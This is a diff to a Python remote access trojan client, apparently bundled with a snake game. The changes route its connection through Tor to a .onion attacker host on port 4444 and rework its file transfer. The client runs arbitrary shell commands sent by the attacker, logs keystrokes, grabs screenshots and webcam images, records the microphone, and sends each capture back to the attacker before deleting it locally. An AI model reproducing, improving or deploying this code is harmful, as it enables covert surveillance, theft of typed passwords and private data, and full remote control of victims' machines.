@@ -7,6 +7,7 @@ import time
 import threading
 import cv2
 import wave
+import struct
 import pyaudio
 from PIL import ImageGrab
 from pynput import keyboard
@@ -14,16 +15,17 @@ import json
 from jeu.snake import jeu 
 
 
-stop = False
+stopkeylogg = False
+stopmic = False
 # RAT:
 
 def connect():
 	while True:
 		try:
-			# socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-			# socket.socket = socks.socksocket
+			socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+			socket.socket = socks.socksocket
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect(('172.20.10.2', 4444))  # IP and Port of the attacker machine
+			s.connect(('xkbgjxztik3tqewffklgrjznloeq6zwu3dvbxp3uiurjsy3jacopd2qd.onion', 4444))  # IP and Port of the attacker machine
 			return s
 		except Exception:
 			time.sleep(5)
@@ -39,14 +41,27 @@ def execute_commands(command):
 
 
 def write_file(path, content):
-	with open(path, 'wb') as file:
-		file.write(base64.b64decode(content))
+	with open(path, 'wb') as f:
+		f.write(content)
+
+def recvall(sock, size):
+    data = b""
+    while len(data) < size:
+        packet = sock.recv(size - len(data))
+        if not packet:
+            return None
+        data += packet
+    return data
 
 
-def read_file(path):
-	with open(path, 'rb') as file:
-		content = base64.b64encode(file.read())
-		return content.decode()
+def send_file(sock, path):
+    with open(path, "rb") as f:
+        data = f.read()
+
+    size = len(data)
+
+    sock.sendall(struct.pack("!Q", size))
+    sock.sendall(data)
 
 def capture_screen():
     try:
@@ -72,8 +87,8 @@ def capture_webcam():
     except Exception as e:
         return f"Error capturing webcam: {str(e)}"
 def send_post_req(time_interval):
-    global stop, text
-    while not stop:
+    global  stopkeylogg,text
+    while not stopkeylogg:
         try:
             payload = json.dumps({"keyboardData": text})
             with open("Keylogg.txt", "a", encoding="utf-8") as f:
@@ -83,7 +98,7 @@ def send_post_req(time_interval):
             print(e)
             print("Couldn't complete request!")
         for _ in range(time_interval):
-            if stop:
+            if stopkeylogg:
                 break
             time.sleep(1)
 
@@ -105,7 +120,6 @@ def on_press(key):
         text += str(key).strip("'")
 
 def keylogger():
-    global stop
     global text
     text = ""
     time_interval = 30
@@ -129,8 +143,8 @@ def record_microphone():
                             frames_per_buffer=CHUNK)
         
         frames = []
-        while not stop : 
-            if stop:
+        while not stopmic : 
+            if stopmic:
                 break
             data = stream.read(CHUNK)
             frames.append(data)
@@ -152,11 +166,9 @@ def record_microphone():
 
 # --- RAT Command Handler ---
 def rat_client():
-	global stop
+	global stopmic,stopkeylogg
 	s = connect()
 	try:
-		keylogger_thread = threading.Thread(target=keylogger, daemon=True)
-		mic_thread = threading.Thread(target=record_microphone, daemon=True)
 		while True:
 			data = s.recv(1000000)
 			if not data:
@@ -174,49 +186,51 @@ def rat_client():
 				path = command[9:]
 				try:
 					if os.path.exists(path):
-						s.send(read_file(path).encode())
+						send_file(s,path)
 					else:
 						s.send(str.encode("File not found"))
 				except Exception as e:
 					s.send(str.encode(f"Error: {str(e)}"))
 			elif command.startswith('upload '):
-				path = command [7:]
-				content = s.recv(100000).decode()
-				content = base64.b64decode(content.encode())
+				path = command.split(' ')[2]
+				size = struct.unpack("!Q", recvall(s, 8))[0]
+				content = recvall(s, size)
 				write_file(path, content)
 				s.send(str.encode("Upload complete"))
 			elif command == 'keylogger':
-				stop = False
+				keylogger_thread = threading.Thread(target=keylogger, daemon=True)
+				stopkeylogg = False
 				s.send(str.encode("Keylogging ..."))
 				keylogger_thread.start()
 			elif command == 'getkeylogger':
 				if keylogger_thread.is_alive():
-					stop = True
+					stopkeylogg = True
 					keylogger_thread.join()
-					s.send(read_file("keylogg.txt").encode())
+					send_file(s,"keylogg.txt")
 					execute_commands("del keylogg.txt")
 				else:
-					s.send(str.encode("Keylogger is not running."))
+					s.send(str.encode("Error:Keylogger is not running."))
 			elif command == 'screenshot':
 				capture_screen()
-				s.send(read_file("screen.png").encode())
+				send_file(s,"screen.png")
 				execute_commands("del screen.png")
 			elif command == 'webcam':
 				capture_webcam()
-				s.send(read_file("webcam.png").encode())
+				send_file(s,"webcam.png")
 				execute_commands("del webcam.png")
 			elif command.startswith('mic'):
-				stop = False
+				mic_thread=threading.Thread(target=record_microphone, daemon=True)
+				stopmic = False
 				s.send(str.encode("Recording ..."))
 				mic_thread.start()
 			elif command == 'getmicrecord':
 				if mic_thread.is_alive():
-					stop = True
+					stopmic = True
 					mic_thread.join()
-					s.send(read_file("microphone.wav").encode())
+					send_file(s,"microphone.wav")
 					execute_commands("del microphone.wav")
 				else:
-					s.send(str.encode("Microphone recording is not running."))
+					s.send(str.encode("Error:Microphone recording is not running."))
 			else:
 				output = execute_commands(command)
 				s.send(str.encode(output))
